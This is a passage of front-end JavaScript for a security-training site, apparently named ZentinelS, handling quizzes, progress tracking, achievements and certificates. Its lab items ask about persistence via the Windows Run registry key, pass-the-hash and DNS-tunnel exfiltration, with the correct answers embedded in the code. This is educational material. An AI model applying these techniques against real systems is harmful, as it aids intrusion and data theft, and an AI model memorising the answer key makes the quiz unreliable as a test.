            ['Kali Linux', 'Ubuntu', 'SIFT Workstation', 'Windows Server'], 2);
    }

    /* C10 NETWORK INFILTRATION LABS */
    function labPersistence(pane) {
        labGeneric(pane, 'Persistence',
            'Which Windows registry key is commonly used for persistence (running programs at login)?',
            ['HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'HKLM\\SYSTEM\\Services', 'HKCU\\Desktop\\Background', 'HKLM\\HARDWARE\\CPU'], 0);
    }

    function labLateral(pane) {
        labGeneric(pane, 'Lateral Movement',
            'What is "Pass-the-Hash" attack?',
            ['Sending hash to a password cracker', 'Using captured NTLM hash directly for authentication without knowing the password', 'Hashing network traffic', 'A denial of service attack'], 1);
    }

    function labExfiltration(pane) {
        labGeneric(pane, 'Data Exfiltration',
            'Why is DNS tunneling effective for exfiltration?',
            ['DNS is encrypted by default', 'DNS traffic (port 53) is usually allowed through firewalls', 'DNS transfers files faster than HTTP', 'DNS doesn\'t require a server'], 1);
    }


    /* Submit lab result */
    async function submitLabResult(lesson, success) {
        if (!state.user || !lesson) return;
        try {
            await api(`/progress/lab/${lesson.id}`, {
                method: 'POST',
                body: JSON.stringify({ completed: success }),
            });
            toast('Lab exercise completed! 🎉', 'success');
        } catch (_) {
            // Silently fail – don't disrupt user experience
        }
    }

    /* ============================================================
       QUIZ
       ============================================================ */
    async function renderQuizTab(lesson) {
        const pane = $('#pane-quiz');
        if (!lesson.id) { pane.innerHTML = '<div class="empty-state"><p>Quiz not available.</p></div>'; return; }
        pane.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading quiz…</span></div>';

        const questions = await loadQuiz(lesson.id);
        if (!questions || !questions.length) { pane.innerHTML = '<div class="empty-state"><div class="icon">❓</div><p>No quiz questions available for this lesson.</p></div>'; return; }

        state.quizData = questions;
        state.quizIndex = 0;
        state.quizScore = 0;
        state.quizAnswered = false;
        state.quizAnswers = []; // Track answers for submission

        renderQuizQuestion(pane);
    }

    function renderQuizQuestion(pane) {
        const q = state.quizData[state.quizIndex];
        const total = state.quizData.length;
        const idx = state.quizIndex;

        if (!q) { renderQuizResults(pane); return; }

        const options = [];
        if (q.optionA) options.push({ key: 'A', text: q.optionA });
        if (q.optionB) options.push({ key: 'B', text: q.optionB });
        if (q.optionC) options.push({ key: 'C', text: q.optionC });
        if (q.optionD) options.push({ key: 'D', text: q.optionD });

        pane.innerHTML = `
            <div class="quiz-container">
                <div class="quiz-progress">
                    <div class="quiz-progress-bar"><div class="quiz-progress-fill" style="width:${((idx) / total) * 100}%"></div></div>
                    <span class="quiz-progress-text">${idx + 1} / ${total}</span>
                </div>
                <div class="question-card">
                    <h3>Q${idx + 1}. ${esc(q.questionText || q.question)}</h3>
                    <ul class="options-list">
                        ${options.map((o) => `<li class="option-item" data-key="${o.key}"><span class="option-letter">${o.key}</span><span>${esc(o.text)}</span></li>`).join('')}
                    </ul>
                    <div class="quiz-explanation" id="quizExplanation" style="display:none"></div>
                    <div class="quiz-actions">
                        <span></span>
                        <button class="btn btn-primary" id="quizNextBtn" style="display:none">Next →</button>
                    </div>
                </div>
            </div>`;

        state.quizAnswered = false;

        $$('.option-item').forEach((opt) => {
            opt.onclick = async () => {
                if (state.quizAnswered) return;
                state.quizAnswered = true;
                const selected = opt.dataset.key;

                // Disable all options immediately
                $$('.option-item').forEach((o) => o.style.pointerEvents = 'none');

                // Check answer via server API
                try {
                    const result = await api('/quiz/check', {
                        method: 'POST',
                        body: JSON.stringify({ questionId: q.id, selected: selected }),
                    });

                    const isCorrect = result.correct;
                    const correctKey = (result.correctAnswer || '').toUpperCase();
                    if (isCorrect) state.quizScore++;

                    // Track answer for final submission
                    state.quizAnswers.push({ questionId: q.id, selected: selected });

                    $$('.option-item').forEach((o) => {
                        if (o.dataset.key === correctKey) o.classList.add('correct');
                        else if (o.dataset.key === selected && !isCorrect) o.classList.add('wrong');
                    });

                    const exp = $('#quizExplanation');
                    exp.style.display = 'block';
                    exp.innerHTML = `<strong>${isCorrect ? '✅ Correct!' : '❌ Incorrect.'}</strong> ${esc(result.explanation || '')}`;

                } catch (err) {
                    // Fallback if server check fails
                    const exp = $('#quizExplanation');
                    exp.style.display = 'block';
                    exp.innerHTML = '<strong>⚠️ Could not verify answer.</strong> Please try again.';
                    state.quizAnswered = false;
                    $$('.option-item').forEach((o) => o.style.pointerEvents = '');
                    return;
                }

                $('#quizNextBtn').style.display = 'inline-flex';
            };
        });

        $('#quizNextBtn').onclick = () => {
            state.quizIndex++;
            renderQuizQuestion(pane);
        };
    }

    function renderQuizResults(pane) {
        const total = state.quizData.length;
        const score = state.quizScore;
        const pct = Math.round((score / total) * 100);
        const pass = pct >= 70;

        pane.innerHTML = `
            <div class="quiz-container">
                <div class="quiz-results">
                    <div class="result-icon">${pass ? '🎉' : '📝'}</div>
                    <h2>${pass ? 'Congratulations!' : 'Keep Learning!'}</h2>
                    <div class="score-display ${pass ? 'pass' : 'fail'}">${pct}%</div>
                    <p class="score-detail">${score} out of ${total} correct</p>
                    <p style="color:var(--text-muted);font-size:0.85rem;margin-bottom:24px">${pass ? 'You\'ve demonstrated a solid understanding of this topic!' : 'Review the theory and demos, then try again. You need 70% to pass.'}</p>
                    <div style="display:flex;gap:10px;justify-content:center">
                        <button class="btn btn-outline" id="quizRetryBtn">🔄 Retry</button>
                        <button class="btn btn-primary" id="quizFinishBtn">✓ Done</button>
                    </div>
                </div>
            </div>`;

        // Submit quiz score via proper endpoint
        if (state.user && state.currentLesson) {
            api(`/quiz/${state.currentLesson.id}/submit`, {
                method: 'POST',
                body: JSON.stringify({ answers: state.quizAnswers }),
            }).then(() => {
                loadProgress(); // Refresh progress after quiz submission
            }).catch(() => {});
        }

        $('#quizRetryBtn').onclick = () => { state.quizIndex = 0; state.quizScore = 0; state.quizAnswers = []; renderQuizQuestion(pane); };
        $('#quizFinishBtn').onclick = () => { $$('.lesson-tab')[0].click(); };
    }

    /* ============================================================
       SCORE / PROGRESS PAGE
       ============================================================ */
    async function renderScore() {
        const c = content();
        if (!state.user) { c.innerHTML = '<div class="empty-state"><div class="icon">🔒</div><p>Please sign in to view your progress.</p></div>'; return; }
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div></div>';
        await loadProgress();
        const lessons = await loadLessons();

        c.innerHTML = `
            <div class="section-header"><h2>Your Progress</h2></div>
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-icon green">✅</div><div class="stat-info"><div class="stat-value">${state.progress.filter((p) => p.completed || p.lessonStatus === 'completed').length}</div><div class="stat-label">Completed</div></div></div>
                <div class="stat-card"><div class="stat-icon yellow">🔄</div><div class="stat-info"><div class="stat-value">${state.progress.filter((p) => p.lessonStatus === 'in_progress').length}</div><div class="stat-label">In Progress</div></div></div>
                <div class="stat-card"><div class="stat-icon blue">📝</div><div class="stat-info"><div class="stat-value">${lessons.length}</div><div class="stat-label">Total Lessons</div></div></div>
                <div class="stat-card"><div class="stat-icon purple">🏆</div><div class="stat-info"><div class="stat-value">${lessons.length > 0 ? Math.round((state.progress.filter((p) => p.completed || p.lessonStatus === 'completed').length / lessons.length) * 100) : 0}%</div><div class="stat-label">Overall</div></div></div>
            </div>
            <div class="card card-flat">
                <h3 style="margin-bottom:12px;color:var(--text-dark)">Lesson Progress</h3>
                <div class="progress-list" id="progressList"></div>
            </div>`;

        const list = $('#progressList');
        lessons.forEach((ls) => {
            const prog = state.progress.find((p) => p.lessonId === ls.id);
            const done = prog && (prog.completed || prog.lessonStatus === 'completed');
            const inProg = prog && prog.lessonStatus === 'in_progress';
            const statusIcon = done ? '✅' : inProg ? '🔄' : '⬜';
            const div = el('div', 'progress-item');
            div.innerHTML = `
                <span style="font-size:1.1rem">${statusIcon}</span>
                <span class="lesson-name">${esc(ls.title)}</span>
                <div class="badges">
                    <span class="badge ${done ? 'badge-done' : inProg ? 'badge-progress' : 'badge-pending'}">${done ? 'Completed' : inProg ? 'In Progress' : 'Not Started'}</span>
                    ${prog && prog.quizScore !== undefined && prog.quizScore > 0 ? `<span class="badge badge-score">Quiz: ${prog.quizScore}%</span>` : ''}
                    ${prog && prog.demoCompleted ? '<span class="badge badge-done">Demo ✓</span>' : ''}
                    ${prog && prog.labCompleted ? '<span class="badge badge-done">Lab ✓</span>' : ''}
                </div>`;
            div.style.cursor = 'pointer';
            div.onclick = () => navigate(`/lesson/${ls.slug}`);
            list.appendChild(div);
        });
    }

    /* ============================================================
       ACHIEVEMENTS
       ============================================================ */
    function renderAchievements() {
        const c = content();
        if (!state.user) { c.innerHTML = '<div class="empty-state"><div class="icon">🔒</div><p>Please sign in to view achievements.</p></div>'; return; }

        const completed = state.progress.filter((p) => p.completed || p.lessonStatus === 'completed').length;
        const achievements = [
            { icon: '🌟', name: 'First Steps', desc: 'Complete your first lesson', unlocked: completed >= 1 },
            { icon: '🔐', name: 'Security Novice', desc: 'Complete 3 lessons', unlocked: completed >= 3 },
            { icon: '🛡️', name: 'Defender', desc: 'Complete 5 lessons', unlocked: completed >= 5 },
            { icon: '⚔️', name: 'Penetration Tester', desc: 'Complete all lessons', unlocked: completed >= 8 },
            { icon: '🏅', name: 'Quiz Master', desc: 'Score 100% on any quiz', unlocked: state.progress.some((p) => p.quizScore >= 100) },
            { icon: '🧪', name: 'Lab Rat', desc: 'Complete all lab exercises', unlocked: state.progress.filter((p) => p.labCompleted).length >= 8 },
        ];

        c.innerHTML = `
            <div class="section-header"><h2>🏆 Achievements</h2></div>
            <div class="courses-grid">${achievements.map((a) => `
                <div class="card" style="${!a.unlocked ? 'opacity:0.5;filter:grayscale(1)' : ''}">
                    <div style="font-size:2.5rem;margin-bottom:8px">${a.icon}</div>
                    <h3 style="font-size:1rem;font-weight:700;color:var(--text-dark);margin-bottom:4px">${a.name}</h3>
                    <p style="font-size:0.85rem;color:var(--text-muted)">${a.desc}</p>
                    <div style="margin-top:8px"><span class="meta-badge ${a.unlocked ? 'beginner' : 'info'}">${a.unlocked ? '✅ Unlocked' : '🔒 Locked'}</span></div>
                </div>`).join('')}
            </div>`;
    }

    /* ============================================================
       SIDEBAR NAV
       ============================================================ */
    function initSidebar() {
        $$('.nav-item[data-route]').forEach((item) => {
            item.addEventListener('click', () => navigate(item.dataset.route));
        });

        const toggle = $('#sidebarToggle');
        const sidebar = $('.sidebar');
        if (toggle && sidebar) {
            toggle.onclick = () => sidebar.classList.toggle('show');
            // close sidebar on mobile when navigating
            window.addEventListener('hashchange', () => sidebar.classList.remove('show'));
        }
    }

    /* ============================================================
       GLOBAL SEARCH
       ============================================================ */
    function initSearch() {
        const searchInput = $('#globalSearch');
        const searchResults = $('#searchResults');
        if (!searchInput || !searchResults) return;

        let debounceTimer;
        searchInput.addEventListener('input', () => {
            clearTimeout(debounceTimer);
            const query = searchInput.value.trim().toLowerCase();
            
            if (query.length < 2) {
                searchResults.classList.add('hidden');
                return;
            }

            debounceTimer = setTimeout(async () => {
                const lessons = await loadLessons(); // ensure lessons loaded
                if (!lessons || lessons.length === 0) {
                    searchResults.innerHTML = '<div class="search-no-results">No lessons available</div>';
                    searchResults.classList.remove('hidden');
                    return;
                }
                
                const results = lessons.filter(l => 
                    (l.title && l.title.toLowerCase().includes(query)) ||
                    (l.summary && l.summary.toLowerCase().includes(query)) ||
                    (l.categoryName && l.categoryName.toLowerCase().includes(query))
                ).slice(0, 8);

                if (results.length === 0) {
                    searchResults.innerHTML = '<div class="search-no-results">No lessons found for "' + esc(query) + '"</div>';
                } else {
                    searchResults.innerHTML = results.map(l => `
                        <div class="search-result-item" data-slug="${l.slug}">
                            <div class="result-title">${esc(l.title)}</div>
                            <div class="result-category">${esc(l.categoryName || 'General')}</div>
                        </div>
                    `).join('');
                    
                    searchResults.querySelectorAll('.search-result-item').forEach(item => {
                        item.addEventListener('click', () => {
                            navigate(`/lesson/${item.dataset.slug}`);
                            searchResults.classList.add('hidden');
                            searchInput.value = '';
                        });
                    });
                }
                searchResults.classList.remove('hidden');
            }, 200);
        });

        // Close search results when clicking outside
        document.addEventListener('click', (e) => {
            if (!e.target.closest('.topbar-search')) {
                searchResults.classList.add('hidden');
            }
        });

        // Handle Escape key
        searchInput.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                searchResults.classList.add('hidden');
                searchInput.blur();
            }
        });
    }

    /* ============================================================
       READING TIME HELPER
       ============================================================ */
    function getReadingTime(content) {
        if (!content) return 1;
        // Approximate words: strip HTML, count words
        const text = content.replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim();
        const words = text.split(' ').length;
        const minutes = Math.ceil(words / 200); // 200 words per minute
        return Math.max(1, minutes);
    }

    function renderReadingTime(minutes) {
        return `<span class="reading-time"><span class="icon">📖</span> ${minutes} min read</span>`;
    }

    /* ============================================================
       RELATED LESSONS
       ============================================================ */
    function renderRelatedLessons(currentLesson) {
        if (!currentLesson || !state.lessons.length) return '';
        
        const related = state.lessons
            .filter(l => l.categoryId === currentLesson.categoryId && l.id !== currentLesson.id)
            .slice(0, 4);
        
        if (related.length === 0) return '';
        
        return `
            <div class="related-lessons">
                <h3>📚 Related Lessons</h3>
                <div class="related-lessons-grid">
                    ${related.map(l => `
                        <div class="related-lesson-card" data-slug="${l.slug}">
                            <div class="title">${esc(l.title)}</div>
                            <div class="category">${esc(l.categoryName || '')}</div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    }

    /* ============================================================
       STREAK TRACKING
       ============================================================ */
    function getStreak() {
        // Get streak from localStorage
        const streakData = JSON.parse(localStorage.getItem('zentinels_streak') || '{}');
        const today = new Date().toDateString();
        const yesterday = new Date(Date.now() - 86400000).toDateString();
        
        if (streakData.lastActivity === today) {
            return streakData.count || 1;
        } else if (streakData.lastActivity === yesterday) {
            return streakData.count || 1;
        } else {
            return 0;
        }
    }

    function updateStreak() {
        const streakData = JSON.parse(localStorage.getItem('zentinels_streak') || '{}');
        const today = new Date().toDateString();
        const yesterday = new Date(Date.now() - 86400000).toDateString();
        
        if (streakData.lastActivity === today) {
            // Already updated today
            return streakData.count;
        } else if (streakData.lastActivity === yesterday) {
            // Continue streak
            streakData.count = (streakData.count || 0) + 1;
        } else {
            // Streak broken, start fresh
            streakData.count = 1;
        }
        
        streakData.lastActivity = today;
        streakData.history = streakData.history || [];
        if (!streakData.history.includes(today)) {
            streakData.history.push(today);
            if (streakData.history.length > 30) {
                streakData.history = streakData.history.slice(-30);
            }
        }
        
        localStorage.setItem('zentinels_streak', JSON.stringify(streakData));
        return streakData.count;
    }

    function renderStreakBadge() {
        const streak = getStreak();
        if (streak === 0) return '';
        return `<span class="streak-badge"><span class="fire">🔥</span> ${streak} day streak</span>`;
    }

    function renderStreakCard() {
        const streakData = JSON.parse(localStorage.getItem('zentinels_streak') || '{}');
        const streak = streakData.count || 0;
        const history = streakData.history || [];
        const today = new Date().toDateString();
        
        // Generate last 7 days
        const days = [];
        for (let i = 6; i >= 0; i--) {
            const date = new Date(Date.now() - i * 86400000);
            const dateStr = date.toDateString();
            const dayName = date.toLocaleDateString('en', { weekday: 'short' }).charAt(0);
            days.push({
                day: dayName,
                active: history.includes(dateStr),
                today: dateStr === today
            });
        }
        
        return `
            <div class="streak-card">
                <div class="streak-number">${streak}</div>
                <div class="streak-label">Day Streak 🔥</div>
                <div class="streak-calendar">
                    ${days.map(d => `
                        <div class="streak-day ${d.active ? 'active' : ''} ${d.today ? 'today' : ''}">${d.day}</div>
                    `).join('')}
                </div>
            </div>
        `;
    }

    /* ============================================================
       PDF CERTIFICATE GENERATION
       ============================================================ */
    function generateCertificate(courseName, userName) {
        // Create certificate content
        const certDate = new Date().toLocaleDateString('en-US', { 
            year: 'numeric', month: 'long', day: 'numeric' 
        });
        
        const certHTML = `
            <div style="width:800px;height:600px;padding:40px;background:linear-gradient(135deg,#f8fafc,#fff);border:4px solid #1a202c;position:relative;font-family:Georgia,serif;">
                <div style="position:absolute;top:0;left:0;right:0;height:8px;background:linear-gradient(90deg,#4c9aff,#8b5cf6,#ec4899);"></div>
                <div style="text-align:center;margin-top:40px;">
                    <div style="font-size:16px;letter-spacing:8px;color:#718096;">CERTIFICATE OF COMPLETION</div>
                    <div style="font-size:48px;margin:20px 0;color:#1a202c;">⚡ ZentinelS</div>
                    <div style="font-size:14px;color:#718096;">Learning Platform</div>
                </div>
                <div style="text-align:center;margin:50px 0;">
                    <div style="font-size:16px;color:#4a5568;">This is to certify that</div>
                    <div style="font-size:32px;color:#4c9aff;margin:15px 0;font-weight:bold;">${esc(userName)}</div>
                    <div style="font-size:16px;color:#4a5568;">has successfully completed the course</div>
                    <div style="font-size:24px;color:#1a202c;margin:15px 0;font-weight:bold;">${esc(courseName)}</div>
                </div>
                <div style="text-align:center;margin-top:60px;">
                    <div style="font-size:14px;color:#718096;">${certDate}</div>
                    <div style="margin-top:30px;border-top:2px solid #e2e8f0;display:inline-block;padding-top:10px;width:200px;">
                        <div style="font-size:12px;color:#718096;">ZentinelS Academy</div>
                    </div>
                </div>
            </div>
        `;
        
        // Open in new window for printing
        const printWindow = window.open('', '_blank');
        printWindow.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Certificate - ${courseName}</title>
                <style>
                    body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f0f0f0; }
                    @media print {
                        body { background: white; }
                        .no-print { display: none; }
                    }
                </style>
            </head>
            <body>
                ${certHTML}
                <div class="no-print" style="position:fixed;top:20px;right:20px;">
                    <button onclick="window.print()" style="padding:12px 24px;background:#4c9aff;color:white;border:none;border-radius:8px;cursor:pointer;font-size:14px;">
                        🖨️ Print Certificate
                    </button>
                </div>
            </body>
            </html>
        `);
        printWindow.document.close();
    }

    function renderCertificateSection(course, totalLessons, completedLessons) {
        if (!state.user) return '';
        
        const isComplete = totalLessons > 0 && completedLessons === totalLessons;
        
        if (!isComplete) {
            return `
                <div class="certificate-card" style="opacity:0.7;">
                    <div class="cert-icon">🎓</div>
                    <div class="cert-title">Certificate Locked</div>
                    <div class="cert-course">Complete all ${totalLessons} lessons to unlock</div>
                    <div class="cert-progress">${completedLessons}/${totalLessons} completed</div>
                </div>
            `;
        }
        
        return `
            <div class="certificate-card">
                <div class="cert-icon">🏆</div>
                <div class="cert-title">Certificate Earned!</div>
                <div class="cert-course">${esc(course.title)}</div>
                <button class="btn btn-primary" onclick="window.appGenerateCert('${esc(course.title)}')">
                    📜 View Certificate
                </button>
            </div>
        `;
    }

    // Expose certificate generation to window for onclick
    window.appGenerateCert = (courseName) => {
        const userName = state.user?.displayName || state.user?.username || 'Student';
        generateCertificate(courseName, userName);
    };

    /* ============================================================
       UTILITIES
       ============================================================ */
    function esc(s) {
        if (!s) return '';
        const d = document.createElement('div');
        d.textContent = s;
        return d.innerHTML;
    }

    /* ============================================================
       INIT
       ============================================================ */
    document.addEventListener('DOMContentLoaded', () => {
        initAuth();
        initSidebar();
        initSearch();
        checkSession();
        updateStreak(); // Update streak on page load
        window.addEventListener('hashchange', router);
        
        // Handle signin/signup hash from admin redirect
        const hash = window.location.hash;
        if (hash === '#signin' || hash === '#login') {
            setTimeout(() => {
                const signInBtn = $('#signInBtn');
                if (signInBtn) signInBtn.click();
                window.location.hash = '#/';
            }, 100);
        } else if (hash === '#signup' || hash === '#register') {
            setTimeout(() => {
                const signUpBtn = $('#signUpBtn');
                if (signUpBtn) signUpBtn.click();
                window.location.hash = '#/';
            }, 100);
        }
        
        router();
    });
})();
